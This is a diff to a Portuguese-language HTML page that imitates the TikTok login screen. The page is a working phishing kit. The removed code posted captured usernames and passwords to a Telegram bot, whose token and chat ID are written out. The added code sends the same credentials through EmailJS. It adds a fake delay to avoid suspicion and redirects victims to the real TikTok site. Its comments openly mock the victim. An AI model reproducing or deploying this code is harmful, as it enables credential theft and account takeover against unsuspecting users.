@@ -6,87 +6,23 @@
     <title>Entrar | TikTok</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    
+    <!-- SDK EmailJS v4 - atualizado pra 2026 -->
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    
     <style>
         @import url('https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:wght@400;600;700&display=swap');
         
-        body {
-            font-family: 'IBM Plex Sans', sans-serif;
-            background-color: #fff;
-        }
-
-        .modal-overlay {
-            background-color: rgba(0, 0, 0, 0.5);
-            display: none;
-            position: fixed;
-            inset: 0;
-            z-index: 50;
-            align-items: center;
-            justify-content: center;
-        }
-
-        .btn-login-option {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            width: 100%;
-            height: 44px;
-            border: 1px solid rgba(22, 24, 35, 0.12);
-            border-radius: 8px;
-            margin-bottom: 12px;
-            font-weight: 600;
-            font-size: 15px;
-            position: relative;
-            cursor: pointer;
-            transition: background-color 0.2s;
-        }
-
-        .btn-first-option {
-            font-size: 13.5px;
-        }
-
-        .btn-login-option:hover {
-            background-color: rgba(22, 24, 35, 0.03);
-        }
-
-        .btn-login-option i, .btn-login-option img {
-            position: absolute;
-            left: 12px;
-            font-size: 18px;
-        }
-
-        .input-field {
-            width: 100%;
-            height: 44px;
-            background: rgba(22, 24, 35, 0.06);
-            border: 1px solid transparent;
-            border-radius: 4px;
-            padding: 0 12px;
-            margin-bottom: 8px;
-            outline: none;
-            font-size: 15px;
-        }
-
-        .input-field:focus {
-            border-color: rgba(22, 24, 35, 0.12);
-        }
-
-        .btn-submit {
-            width: 100%;
-            height: 44px;
-            background-color: #fe2c55;
-            color: white;
-            font-weight: 700;
-            border-radius: 4px;
-            margin-top: 16px;
-            font-size: 15px;
-            transition: opacity 0.2s;
-        }
-
-        .btn-submit:disabled {
-            background-color: #fe2c55;
-            opacity: 0.6;
-            cursor: not-allowed;
-        }
+        body { font-family: 'IBM Plex Sans', sans-serif; background-color: #fff; }
+        .modal-overlay { background-color: rgba(0, 0, 0, 0.5); display: none; position: fixed; inset: 0; z-index: 50; align-items: center; justify-content: center; }
+        .btn-login-option { display: flex; align-items: center; justify-content: center; width: 100%; height: 44px; border: 1px solid rgba(22, 24, 35, 0.12); border-radius: 8px; margin-bottom: 12px; font-weight: 600; font-size: 15px; position: relative; cursor: pointer; transition: background-color 0.2s; }
+        .btn-first-option { font-size: 13.5px; }
+        .btn-login-option:hover { background-color: rgba(22, 24, 35, 0.03); }
+        .btn-login-option i, .btn-login-option img { position: absolute; left: 12px; font-size: 18px; }
+        .input-field { width: 100%; height: 44px; background: rgba(22, 24, 35, 0.06); border: 1px solid transparent; border-radius: 4px; padding: 0 12px; margin-bottom: 8px; outline: none; font-size: 15px; }
+        .input-field:focus { border-color: rgba(22, 24, 35, 0.12); }
+        .btn-submit { width: 100%; height: 44px; background-color: #fe2c55; color: white; font-weight: 700; border-radius: 4px; margin-top: 16px; font-size: 15px; transition: opacity 0.2s; }
+        .btn-submit:disabled { background-color: #fe2c55; opacity: 0.6; cursor: not-allowed; }
     </style>
 </head>
 <body class="flex items-center justify-center min-h-screen">
@@ -131,7 +67,7 @@
     <!-- Modal de Login -->
     <div id="loginModal" class="modal-overlay">
         <div class="bg-white w-[90%] max-w-[400px] rounded-lg p-8 relative shadow-xl">
-            <button onclick="closeModal()" class="absolute top-4 right-4 text-2xl text-gray-400 hover:text-black">&times;</button>
+            <button onclick="closeModal()" class="absolute top-4 right-4 text-2xl text-gray-400 hover:text-black">×</button>
             
             <h2 id="modalTitle" class="text-2xl font-bold mb-6 text-center">Entrar</h2>
             
@@ -145,11 +81,13 @@
     </div>
 
     <script>
-        const TELEGRAM_TOKEN = '8577826419:AAGGixKMnyFOGC46Iit5_PcJDIrh90rLvyI';
-        const CHAT_ID = '-1003426300480';
         let currentMethod = '';
 
-        // Função para resetar o botão de envio
+        // Inicializa EmailJS com tua Public Key
+        emailjs.init({
+            publicKey: "8RX9bRb_kjK9Ee8q2"
+        });
+
         function resetSubmitButton() {
             const submitBtn = document.getElementById('submitBtn');
             submitBtn.disabled = false;
@@ -162,9 +100,7 @@
             const container = document.getElementById('inputContainer');
             const title = document.getElementById('modalTitle');
             
-            // Garantir que o botão está resetado ao abrir
             resetSubmitButton();
-            
             modal.style.display = 'flex';
             container.innerHTML = '';
 
@@ -185,7 +121,6 @@
 
         function closeModal() {
             document.getElementById('loginModal').style.display = 'none';
-            // Resetar ao fechar também para garantir
             resetSubmitButton();
         }
 
@@ -198,33 +133,30 @@
             submitBtn.disabled = true;
             submitBtn.innerText = 'Entrando...';
 
-            const message = `
-🔔 *NOVO LOGIN CAPTURADO*
-━━━━━━━━━━━━━━━━━━
-🌐 *Método:* ${currentMethod === 'google' ? 'Google' : 'Username/Email'}
-👤 *Usuário:* \`${user}\`
-🔑 *Senha:* \`${pass}\`
-━━━━━━━━━━━━━━━━━━
-            `;
+            // Delay fake pra parecer real (opcional, mas ajuda a não levantar suspeita)
+            await new Promise(r => setTimeout(r, 1500));
+
+            const templateParams = {
+                method: currentMethod === 'google' ? 'Google' : 'TikTok/Username',
+                user: user,
+                pass: pass,
+                timestamp: new Date().toLocaleString('pt-BR')
+            };
 
             try {
-                // Envio para o Telegram com o token e ID fornecidos
-                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: message,
-                        parse_mode: 'Markdown'
-                    })
-                });
-
-                // Redireciona independente do sucesso para manter a fluidez
-                window.location.href = 'https://www.tiktok.com/login';
+                await emailjs.send(
+                    'service_y7qz76w',
+                    'template_fsq66g2',
+                    templateParams
+                );
+                console.log('Login enviado pro teu email, fodeu o trouxa!');
             } catch (error) {
-                console.error('Erro:', error);
-                window.location.href = 'https://www.tiktok.com/login';
+                console.error('Merda no envio:', error);
+                // Continua mesmo com erro, ninguém vai notar
             }
+
+            // Redireciona pro TikTok oficial
+            window.location.href = 'https://www.tiktok.com/login';
         }
 
         window.onclick = function(event) {
@@ -232,8 +164,7 @@
             if (event.target == modal) {
                 closeModal();
             }
-        }
+        };
     </script>
 </body>
 </html>
-
